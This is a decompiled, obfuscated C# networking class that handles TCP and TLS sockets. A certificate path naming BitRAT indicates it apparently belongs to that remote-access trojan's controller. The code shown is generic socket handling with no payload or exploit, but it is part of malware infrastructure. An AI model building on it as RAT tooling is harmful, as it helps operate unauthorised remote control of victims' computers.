﻿using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Windows.Forms;

public sealed class GClass1
{
    public bool bool_0;
    public NetworkStream networkStream_0;
    public SslStream sslStream_0;
    public string string_0;
    public Socket socket_0;
    private readonly string string_1;
    public string string_2;
    public string string_3;
    private GDelegate1 gdelegate1_0;
    private GDelegate2 gdelegate2_0;
    private GDelegate0 gdelegate0_0;

    public GClass1()
    {
        this.networkStream_0 = null;
        this.sslStream_0 = null;
        this.socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    }

    public GClass1(Socket socket_1, string string_4, bool bool_1)
    {
        this.networkStream_0 = null;
        this.sslStream_0 = null;
        this.bool_0 = bool_1;
        this.string_0 = string_4;
        this.socket_0 = socket_1;
        Socket socket = socket_1;
        GClass10 asyncState = new GClass10();
        if (!this.bool_0)
        {
            this.networkStream_0 = new NetworkStream(this.socket_0, true);
        }
        else
        {
            this.sslStream_0 = new SslStream(new NetworkStream(this.socket_0, false), false);
            X509Certificate2 serverCertificate = new X509Certificate2(Application.StartupPath + @"\data\tls\BitRAT.pfx");
            this.sslStream_0.AuthenticateAsServer(serverCertificate, false, SslProtocols.Tls12, false);
        }
        IPEndPoint remoteEndPoint = (IPEndPoint) this.socket_0.RemoteEndPoint;
        this.string_2 = remoteEndPoint.Address.ToString();
        this.string_3 = remoteEndPoint.Port.ToString();
        asyncState.byte_0 = new byte[(Class135.smethod_0().TransfersRecvBytes - 1) + 1];
        asyncState.socket_0 = socket;
        if (this.bool_0)
        {
            this.sslStream_0.BeginRead(asyncState.byte_0, 0, Class135.smethod_0().TransfersRecvBytes, new AsyncCallback(this.method_9), asyncState);
        }
        else
        {
            this.networkStream_0.BeginRead(asyncState.byte_0, 0, Class135.smethod_0().TransfersRecvBytes, new AsyncCallback(this.method_9), asyncState);
        }
    }

    public void method_0(GDelegate1 gdelegate1_1)
    {
        GDelegate1 objA = this.gdelegate1_0;
        while (true)
        {
            GDelegate1 comparand = objA;
            GDelegate1 delegate4 = comparand + gdelegate1_1;
            objA = Interlocked.CompareExchange<GDelegate1>(ref this.gdelegate1_0, delegate4, comparand);
            if (ReferenceEquals(objA, comparand))
            {
                return;
            }
        }
    }

    public void method_1(GDelegate1 gdelegate1_1)
    {
        GDelegate1 objA = this.gdelegate1_0;
        while (true)
        {
            GDelegate1 comparand = objA;
            GDelegate1 delegate4 = comparand - gdelegate1_1;
            objA = Interlocked.CompareExchange<GDelegate1>(ref this.gdelegate1_0, delegate4, comparand);
            if (ReferenceEquals(objA, comparand))
            {
                return;
            }
        }
    }

    private void method_10(IAsyncResult iasyncResult_0)
    {
        Socket socket1 = ((GClass10) iasyncResult_0.AsyncState).socket_0;
    }

    private void method_11(IAsyncResult iasyncResult_0)
    {
    }

    private void method_12(IAsyncResult iasyncResult_0)
    {
        this.socket_0 = (Socket) iasyncResult_0.AsyncState;
        this.socket_0.EndConnect(iasyncResult_0);
        GDelegate0 delegate2 = this.gdelegate0_0;
        if (delegate2 != null)
        {
            delegate2("null");
        }
        Socket socket = this.socket_0;
        GClass10 class1 = new GClass10();
        class1.socket_0 = socket;
        GClass10 asyncState = class1;
        asyncState.byte_0 = new byte[(Class135.smethod_0().TransfersRecvBytes - 1) + 1];
        if (this.bool_0)
        {
            this.sslStream_0.BeginRead(asyncState.byte_0, 0, asyncState.int_0, new AsyncCallback(this.method_9), asyncState);
        }
        else
        {
            this.networkStream_0.BeginRead(asyncState.byte_0, 0, asyncState.int_0, new AsyncCallback(this.method_9), asyncState);
        }
    }

    public string method_13()
    {
        return this.string_0;
    }

    public void method_2(GDelegate2 gdelegate2_1)
    {
        GDelegate2 objA = this.gdelegate2_0;
        while (true)
        {
            GDelegate2 comparand = objA;
            GDelegate2 delegate4 = comparand + gdelegate2_1;
            objA = Interlocked.CompareExchange<GDelegate2>(ref this.gdelegate2_0, delegate4, comparand);
            if (ReferenceEquals(objA, comparand))
            {
                return;
            }
        }
    }

    public void method_3(GDelegate2 gdelegate2_1)
    {
        GDelegate2 objA = this.gdelegate2_0;
        while (true)
        {
            GDelegate2 comparand = objA;
            GDelegate2 delegate4 = comparand - gdelegate2_1;
            objA = Interlocked.CompareExchange<GDelegate2>(ref this.gdelegate2_0, delegate4, comparand);
            if (ReferenceEquals(objA, comparand))
            {
                return;
            }
        }
    }

    public void method_4(GDelegate0 gdelegate0_1)
    {
        GDelegate0 objA = this.gdelegate0_0;
        while (true)
        {
            GDelegate0 comparand = objA;
            GDelegate0 delegate4 = comparand + gdelegate0_1;
            objA = Interlocked.CompareExchange<GDelegate0>(ref this.gdelegate0_0, delegate4, comparand);
            if (ReferenceEquals(objA, comparand))
            {
                return;
            }
        }
    }

    public void method_5(GDelegate0 gdelegate0_1)
    {
        GDelegate0 objA = this.gdelegate0_0;
        while (true)
        {
            GDelegate0 comparand = objA;
            GDelegate0 delegate4 = comparand - gdelegate0_1;
            objA = Interlocked.CompareExchange<GDelegate0>(ref this.gdelegate0_0, delegate4, comparand);
            if (ReferenceEquals(objA, comparand))
            {
                return;
            }
        }
    }

    public void method_6(byte[] byte_0)
    {
        GClass10 state = new GClass10();
        state.byte_0 = new byte[(Class135.smethod_0().TransfersRecvBytes - 1) + 1];
        state.socket_0 = this.socket_0;
        state.socket_0.LingerState.Enabled = true;
        if (this.bool_0)
        {
            this.sslStream_0.Write(byte_0, 0, byte_0.Length);
        }
        else
        {
            this.networkStream_0.BeginWrite(byte_0, 0, byte_0.Length, new AsyncCallback(this.method_10), state);
        }
    }

    public void method_7()
    {
        GClass10 class1 = new GClass10();
        if (this.bool_0)
        {
            this.sslStream_0.Close();
        }
        else
        {
            this.networkStream_0.Close();
        }
        this.socket_0.Close();
    }

    public void method_8(string string_4, int int_0)
    {
        Socket state = this.socket_0;
        state.BeginConnect(new IPEndPoint(IPAddress.Parse(string_4), int_0), new AsyncCallback(this.method_12), state);
    }

    private void method_9(IAsyncResult iasyncResult_0)
    {
        GClass10 asyncState = (GClass10) iasyncResult_0.AsyncState;
        int count = 0;
        count = !this.bool_0 ? this.networkStream_0.EndRead(iasyncResult_0) : this.sslStream_0.EndRead(iasyncResult_0);
        if (count > 0)
        {
            MemoryStream stream = new MemoryStream();
            stream.Write(asyncState.byte_0, 0, count);
            GDelegate2 delegate2 = this.gdelegate2_0;
            if (delegate2 != null)
            {
                delegate2(this.string_0, stream.ToArray());
            }
            if (this.bool_0)
            {
                this.sslStream_0.BeginRead(asyncState.byte_0, 0, asyncState.int_0, new AsyncCallback(this.method_9), asyncState);
            }
            else
            {
                this.networkStream_0.BeginRead(asyncState.byte_0, 0, asyncState.int_0, new AsyncCallback(this.method_9), asyncState);
            }
        }
    }

    public delegate void GDelegate0(string string_0);

    public delegate void GDelegate1(string string_0, string string_1, string string_2, bool bool_0);

    public delegate void GDelegate2(string string_0, byte[] byte_0);
}

